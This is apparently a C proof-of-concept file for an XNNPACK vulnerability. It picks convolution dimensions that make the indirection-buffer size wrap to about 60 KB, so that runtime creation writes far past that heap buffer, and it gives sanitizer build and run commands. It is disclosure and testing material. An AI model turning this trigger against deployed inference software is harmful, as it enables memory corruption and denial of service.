/*
 * XNNPACK CVE PoC: Conv2D Indirection Buffer Integer Overflow
 *
 * Triggers the heap buffer overflow in reshape_igemm() at:
 *   src/operators/convolution-nhwc.c:2624-2625
 *
 * indirection_buffer_size = sizeof(void*) * kernel_size * tiled_output_size
 * With OH=506164740, OW=506168760, kernel=3x3:
 *   = 8 * 9 * 256204778801522400 = 18446744073709612800
 *   mod 2^64 = 61184  (wraps to ~60 KB)
 *
 * Allocation succeeds with 61184 bytes, but the subsequent
 * xnn_indirection_init_conv2d() writes ~17 TB past the buffer.
 *
 * Build & run:
 *   clang -fsanitize=address,undefined -g poc_conv2d_overflow.c \
 *     -I XNNPACK/include -L build-asan -lXNNPACK -lpthread \
 *     -Wl,-rpath,build-asan -o poc_conv2d_overflow
 *   ASAN_OPTIONS=halt_on_error=1:print_stats=1 ./poc_conv2d_overflow
 */

#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include "xnnpack.h"

/* Output dimensions chosen so that OH * OW wraps mod 2^64 after ×72 */
#define INPUT_HEIGHT  506164742UL
#define INPUT_WIDTH   506168762UL
#define OUTPUT_HEIGHT 506164740UL
#define OUTPUT_WIDTH  506168760UL

static void print_overflow_math(void) {
    uint64_t oh = OUTPUT_HEIGHT, ow = OUTPUT_WIDTH;
    uint64_t output_size = oh * ow;           /* fits uint64 (just) */
    uint64_t kernel_size = 9;
    uint64_t ptr_size    = sizeof(void *);
    uint64_t buf_size    = ptr_size * kernel_size * output_size; /* wraps */

    printf("=== Integer Overflow Verification ===\n");
    printf("  output_height      = %lu\n", (unsigned long)oh);
    printf("  output_width       = %lu\n", (unsigned long)ow);
    printf("  output_size (OH*OW)= %lu\n", (unsigned long)output_size);
    printf("  kernel_size        = %lu\n", (unsigned long)kernel_size);
    printf("  ptr_size           = %lu bytes\n", (unsigned long)ptr_size);
    printf("  indirection_buf_sz = ptr_size*kernel_size*output_size\n");
    printf("  (true value)       = 0x%016lx (wrapped mod 2^64)\n",
           (unsigned long)buf_size);
    printf("  Actual bytes alloc = %lu (~60 KB)\n", (unsigned long)buf_size);
    printf("  Actual bytes write = ~17 TB\n\n");
}

int main(void) {
    printf("XNNPACK Conv2D Indirection Buffer Overflow PoC\n");
    printf("-----------------------------------------------\n\n");

    print_overflow_math();

    enum xnn_status status = xnn_initialize(NULL);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_initialize failed: %d\n", status);
        return 1;
    }
    printf("[+] xnn_initialize() OK\n");

    xnn_subgraph_t subgraph = NULL;
    status = xnn_create_subgraph(/*external_value_ids=*/2,
                                  /*flags=*/0, &subgraph);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_create_subgraph failed: %d\n", status);
        return 1;
    }
    printf("[+] xnn_create_subgraph() OK\n");

    /* Input tensor: [1, OH+2, OW+2, 1]  (padding=0 → output = OH×OW) */
    uint32_t input_id  = XNN_INVALID_VALUE_ID;
    uint32_t output_id = XNN_INVALID_VALUE_ID;

    size_t input_dims[]  = {1, INPUT_HEIGHT,  INPUT_WIDTH,  1};
    size_t output_dims[] = {1, OUTPUT_HEIGHT, OUTPUT_WIDTH, 1};

    status = xnn_define_tensor_value(
        subgraph, xnn_datatype_fp32,
        /*num_dims=*/4, input_dims,
        /*data=*/NULL, /*external_id=*/0,
        XNN_VALUE_FLAG_EXTERNAL_INPUT, &input_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_tensor_value (input) failed: %d\n", status);
        return 1;
    }

    status = xnn_define_tensor_value(
        subgraph, xnn_datatype_fp32,
        /*num_dims=*/4, output_dims,
        /*data=*/NULL, /*external_id=*/1,
        XNN_VALUE_FLAG_EXTERNAL_OUTPUT, &output_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_tensor_value (output) failed: %d\n", status);
        return 1;
    }
    printf("[+] Tensor values defined (input_id=%u, output_id=%u)\n",
           input_id, output_id);

    /* 3×3 conv kernel [out=1, kH=3, kW=3, in=1] and bias [1] */
    static const float kernel[1 * 3 * 3 * 1] = {0};
    static const float bias[1]                = {0};

    uint32_t filter_id = XNN_INVALID_VALUE_ID;
    uint32_t bias_id   = XNN_INVALID_VALUE_ID;

    size_t filter_dims[] = {1, 3, 3, 1};
    status = xnn_define_tensor_value(
        subgraph, xnn_datatype_fp32,
        4, filter_dims, kernel,
        /*external_id=*/XNN_INVALID_VALUE_ID, /*flags=*/0, &filter_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_tensor_value (filter) failed: %d\n", status);
        return 1;
    }

    size_t bias_dims[] = {1};
    status = xnn_define_tensor_value(
        subgraph, xnn_datatype_fp32,
        1, bias_dims, bias,
        /*external_id=*/XNN_INVALID_VALUE_ID, /*flags=*/0, &bias_id);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_tensor_value (bias) failed: %d\n", status);
        return 1;
    }
    printf("[+] Filter/bias tensors defined (filter_id=%u, bias_id=%u)\n",
           filter_id, bias_id);

    status = xnn_define_convolution_2d(
        subgraph,
        /*input_padding_top=*/0,    /*input_padding_right=*/0,
        /*input_padding_bottom=*/0, /*input_padding_left=*/0,
        /*kernel_height=*/3, /*kernel_width=*/3,
        /*subsampling_height=*/1, /*subsampling_width=*/1,
        /*dilation_height=*/1,    /*dilation_width=*/1,
        /*groups=*/1,
        /*group_input_channels=*/1,
        /*group_output_channels=*/1,
        /*output_min=*/-INFINITY, /*output_max=*/INFINITY,
        input_id, filter_id, bias_id, output_id,
        /*flags=*/0);
    if (status != xnn_status_success) {
        fprintf(stderr, "xnn_define_convolution_2d failed: %d\n", status);
        return 1;
    }
    printf("[+] xnn_define_convolution_2d() OK (3x3 kernel, stride=1)\n");

    /* Create runtime — this triggers reshape → indirection buffer overflow */
    xnn_runtime_t runtime = NULL;
    xnn_workspace_t workspace = NULL;

    xnn_create_workspace(&workspace);

    printf("[*] Calling xnn_create_runtime_v4() ...\n");
    printf("[*] This will trigger reshape_igemm() → OVERFLOW\n");
    printf("[*] ASAN/UBSAN should fire during reshape\n\n");

    status = xnn_create_runtime_v4(subgraph, NULL, workspace,
                                    /*threadpool=*/NULL, /*flags=*/0, &runtime);

    /* If we somehow reach here, ASAN/UBSAN is not catching it */
    if (status == xnn_status_success && runtime != NULL) {
        printf("[!] Runtime created — calling xnn_reshape_runtime()\n");
        status = xnn_reshape_runtime(runtime);
        printf("[!] xnn_reshape_runtime returned: %d\n", status);
        printf("[!] WARNING: Overflow NOT detected — sanitizers may be off\n");
        xnn_delete_runtime(runtime);
    } else {
        printf("[?] xnn_create_runtime returned status=%d\n", status);
        printf("[?] Check ASAN output above for overflow report\n");
    }

    xnn_release_workspace(workspace);
    xnn_delete_subgraph(subgraph);
    return 0;
}
